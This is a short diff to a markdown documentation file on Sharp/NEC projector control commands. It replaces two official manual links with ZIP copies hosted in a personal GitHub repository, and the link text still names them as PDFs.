@@ -67,5 +67,5 @@ BASE MODEL TYPE REQUEST/RESPONSE
 
 
 ## References
-[pj-control-command-codes.pdf](https://assets.sharpnecdisplays.us/documents/miscellaneous/pj-control-command-codes.pdf)<br>
-[pj-controlcommands-appendixes.pdf](https://assets.sharpnecdisplays.us/documents/usermanuals/pj-controlcommands-appendixes.pdf)
+[pj-control-command-codes.pdf](https://github.com/ericwu1997/ericwu1997.github.io/raw/refs/heads/main/docs/protocol-analysis/transport-layer/sharp-pj-cmd/pj-control-command-codes.zip)
+[pj-controlcommands-appendixes.pdf](https://github.com/ericwu1997/ericwu1997.github.io/raw/refs/heads/main/docs/protocol-analysis/transport-layer/sharp-pj-cmd/pj-controlcommands-appendixes.zip)
